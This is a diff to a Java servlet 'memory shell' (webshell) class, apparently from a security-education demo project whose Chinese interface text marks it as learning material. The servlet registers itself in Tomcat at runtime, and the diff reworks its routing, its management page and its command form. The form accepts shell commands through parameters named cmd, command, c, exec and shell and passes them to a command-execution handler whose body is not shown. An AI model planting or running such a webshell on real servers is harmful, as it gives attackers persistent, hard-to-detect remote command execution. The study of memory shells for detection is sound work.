@@ -26,7 +26,7 @@ public class ServletMemoryShell extends HttpServlet implements MemoryShell {
     
     private static final long serialVersionUID = 1L;
     private static final String SHELL_NAME = "DemoMemoryShell";
-    private static final String URL_PATTERN = "/shell/*";
+    private static final String URL_PATTERN = "/memshell/servlet/*";
     
     private MemoryShellInfo info;
     private boolean injected = false;
@@ -208,23 +208,38 @@ public class ServletMemoryShell extends HttpServlet implements MemoryShell {
         String cmd = getCommandParameter(request);
         String action = request.getParameter("action");
         String type = request.getParameter("type");
+        String servletAction = request.getParameter("servletAction");
         
         // 如果是简单的命令执行请求（用于连接器兼容）
-        if (cmd != null && !cmd.trim().isEmpty() && action == null) {
+        if (cmd != null && !cmd.trim().isEmpty() && action == null && servletAction == null) {
             handleCommandExecution(request, response, cmd);
             return;
         }
         
-        // 如果有type=servlet参数，确保这是给Servlet处理的请求
-        if ("servlet".equals(type) || action != null || cmd != null) {
-            // 继续处理Servlet内存马页面
-        } else {
-            // 这可能是其他组件的请求，不处理
-            response.setStatus(HttpServletResponse.SC_NOT_FOUND);
+        // 处理通用的shell请求（action=info&type=servlet）
+        if ("info".equals(action) && "servlet".equals(type)) {
+            // 如果有命令参数，优先处理命令执行，然后显示info页面
+            handleMemoryShellRequest(request, response, cmd, "info");
             return;
         }
         
-        // 否则显示完整的Web界面
+        // 处理Servlet特有的请求
+        if (cmd != null || servletAction != null || "servlet".equals(type)) {
+            // 处理内存马请求
+            handleMemoryShellRequest(request, response, cmd, servletAction);
+            return;
+        }
+        
+        // 默认显示基本页面（当直接访问/shell时）
+        handleMemoryShellRequest(request, response, null, null);
+        
+        // 这可能是其他组件的请求，不处理
+        response.setStatus(HttpServletResponse.SC_NOT_FOUND);
+    }
+    
+    private void handleMemoryShellRequest(HttpServletRequest request, HttpServletResponse response, 
+                                        String cmd, String action) throws IOException {
+        
         response.setContentType("text/html;charset=UTF-8");
         PrintWriter out = response.getWriter();
         
@@ -238,7 +253,7 @@ public class ServletMemoryShell extends HttpServlet implements MemoryShell {
         out.println("</head><body>");
         
         out.println("<div class='warning'>");
-        out.println("⚠️ 警告: 这是一个用于安全教育的内存马演示<br>");
+        out.println("⚠️ 警告: 这是一个用于安全教育的Servlet内存马演示<br>");
         out.println("此功能仅用于学习和演示目的，请勿用于非法用途！");
         out.println("</div>");
         
@@ -246,10 +261,11 @@ public class ServletMemoryShell extends HttpServlet implements MemoryShell {
         
         // 显示内存马信息
         out.println("<div class='info'>");
-        out.println("<h3>内存马信息:</h3>");
+        out.println("<h3>Servlet内存马信息:</h3>");
         out.println("ID: " + info.getId() + "<br>");
         out.println("名称: " + info.getName() + "<br>");
         out.println("类型: " + info.getType().getName() + "<br>");
+        out.println("URL模式: " + URL_PATTERN + "<br>");
         out.println("注入时间: " + new java.util.Date(info.getInjectionTime()) + "<br>");
         out.println("访问次数: " + info.getAccessCount() + "<br>");
         out.println("状态: " + (info.isActive() ? "活跃" : "非活跃") + "<br>");
@@ -273,36 +289,47 @@ public class ServletMemoryShell extends HttpServlet implements MemoryShell {
             // 移除内存马
             try {
                 if (remove()) {
-                    out.println("<div style='color:green;'>内存马已成功移除</div>");
+                    out.println("<div style='color:green;'>Servlet内存马已成功移除</div>");
                 } else {
-                    out.println("<div style='color:red;'>移除内存马失败</div>");
+                    out.println("<div style='color:red;'>移除Servlet内存马失败</div>");
                 }
             } catch (Exception e) {
                 out.println("<div style='color:red;'>移除异常: " + e.getMessage() + "</div>");
             }
+        } else if ("mapping".equals(action)) {
+            // 显示映射信息
+            displayMappingInfo(out, request);
         }
         
         // 命令执行表单
-        out.println("<h3>命令执行:</h3>");
+        out.println("<h3>命令执行 (仅限演示命令):</h3>");
         out.println("<form method='post'>");
         out.println("<input type='hidden' name='action' value='info'>");
         out.println("<input type='hidden' name='type' value='servlet'>");
-        out.println("<input type='text' name='cmd' placeholder='输入命令' value='" + 
+        out.println("<input type='text' name='cmd' placeholder='输入命令 (如: whoami, pwd, date)' value='" + 
                    (cmd != null ? escapeHtml(cmd) : "") + "'>");
         out.println("<input type='submit' value='执行'>");
         out.println("</form>");
         
         // 功能按钮
-        out.println("<h3>内存马管理:</h3>");
+        out.println("<h3>Servlet内存马管理:</h3>");
         out.println("<form method='get' style='display:inline;'>");
-        out.println("<input type='hidden' name='action' value='info'>");
+        out.println("<input type='hidden' name='servletAction' value='info'>");
         out.println("<input type='submit' value='查看详细信息'>");
         out.println("</form>");
         
         out.println("<form method='get' style='display:inline;'>");
-        out.println("<input type='hidden' name='action' value='remove'>");
-        out.println("<input type='submit' value='移除内存马' onclick='return confirm(\"确定要移除内存马吗？\")'>");
+        out.println("<input type='hidden' name='servletAction' value='mapping'>");
+        out.println("<input type='submit' value='查看拦截信息'>");
         out.println("</form>");
+        
+        out.println("<form method='get' style='display:inline;'>");
+        out.println("<input type='hidden' name='servletAction' value='remove'>");
+        out.println("<input type='submit' value='移除内存马' onclick='return confirm(\"确定要移除Servlet内存马吗？\")'>");
+        out.println("</form>");
+        
+        out.println("<br><br><p><strong>Servlet特性:</strong> 通过URL模式 " + URL_PATTERN + 
+                   " 访问，支持GET/POST请求处理</p>");
         
         out.println("</body></html>");
     }
@@ -355,7 +382,7 @@ public class ServletMemoryShell extends HttpServlet implements MemoryShell {
     }
     
     private void displayDetailedInfo(PrintWriter out) {
-        out.println("<h3>内存马详细信息:</h3>");
+        out.println("<h3>Servlet内存马详细信息:</h3>");
         out.println("<div class='info'>");
         out.println("<table border='1' cellpadding='5'>");
         out.println("<tr><td>属性</td><td>值</td></tr>");
@@ -363,12 +390,32 @@ public class ServletMemoryShell extends HttpServlet implements MemoryShell {
         out.println("<tr><td>类名</td><td>" + info.getClassName() + "</td></tr>");
         out.println("<tr><td>注入点</td><td>" + info.getInjectionPoint() + "</td></tr>");
         out.println("<tr><td>URL模式</td><td>" + URL_PATTERN + "</td></tr>");
+        out.println("<tr><td>支持的参数名</td><td>cmd, command, c, exec, shell</td></tr>");
         
         for (Map.Entry<String, Object> entry : info.getMetadata().entrySet()) {
             out.println("<tr><td>" + entry.getKey() + "</td><td>" + entry.getValue() + "</td></tr>");
         }
         
         out.println("</table>");
+        out.println("</div>");
+    }
+    
+    private void displayMappingInfo(PrintWriter out, HttpServletRequest request) {
+        out.println("<h3>Servlet拦截信息:</h3>");
+        out.println("<div class='info'>");
+        out.println("<strong>当前请求信息:</strong><br>");
+        out.println("请求URI: " + request.getRequestURI() + "<br>");
+        out.println("请求方法: " + request.getMethod() + "<br>");
+        out.println("客户端IP: " + request.getRemoteAddr() + "<br>");
+        out.println("User-Agent: " + request.getHeader("User-Agent") + "<br>");
+        out.println("请求时间: " + new java.util.Date() + "<br>");
+        
+        out.println("<br><strong>Servlet工作原理:</strong><br>");
+        out.println("1. 通过StandardContext.addChild()动态注册Servlet<br>");
+        out.println("2. 映射到URL模式: " + URL_PATTERN + "<br>");
+        out.println("3. 检查请求参数中是否包含命令参数<br>");
+        out.println("4. 如果包含，处理内存马逻辑；否则显示Web界面<br>");
+        out.println("5. 可以在请求到达时进行命令执行或信息展示<br>");
         out.println("</div>");
     }
     
